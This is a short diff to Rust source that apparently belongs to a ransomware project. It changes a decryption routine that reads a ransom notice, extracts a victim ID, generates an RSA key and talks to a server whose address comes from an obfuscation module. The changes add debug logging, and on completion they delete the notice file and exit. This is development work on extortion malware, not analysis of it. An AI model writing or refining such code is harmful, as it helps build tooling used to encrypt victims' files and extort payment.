@@ -1,3 +1,4 @@
+use std::fs;
 use std::path::PathBuf;
 use std::process::Command;
 use std::thread::sleep;
@@ -14,7 +15,7 @@ use crate::obfuscation::get_ip;
 use crate::{encryptor, THREADS};
 
 pub(crate) async fn decryption_script(notice_path: PathBuf) {
-    let content = read_to_string(notice_path);
+    let content = read_to_string(&notice_path);
     if content.is_err() {
         event!(Level::ERROR, "Content could not be read, exiting...");
         sleep(Duration::from_secs(3));
@@ -32,6 +33,8 @@ pub(crate) async fn decryption_script(notice_path: PathBuf) {
         .unwrap()
         .trim();
     let ucid: u64 = ucid.parse().unwrap();
+
+    event!(Level::DEBUG, "UCID extracted as: {:?}", ucid);
     let key = Rsa::generate(4096).unwrap();
 
     let request_blob =
@@ -153,8 +156,16 @@ pub(crate) async fn decryption_script(notice_path: PathBuf) {
                     for thread in threads {
                         let _ = thread.await;
                     }
+                    let _ = fs::remove_file(notice_path);
+                    event!(Level::INFO, "Decryption completed, exiting...");
+                    exit(0);
                 }
-                _ => {
+                x => {
+                    event!(
+                        Level::DEBUG,
+                        "Recieved invalid message from server: {:?}",
+                        x
+                    );
                     continue;
                 }
             }
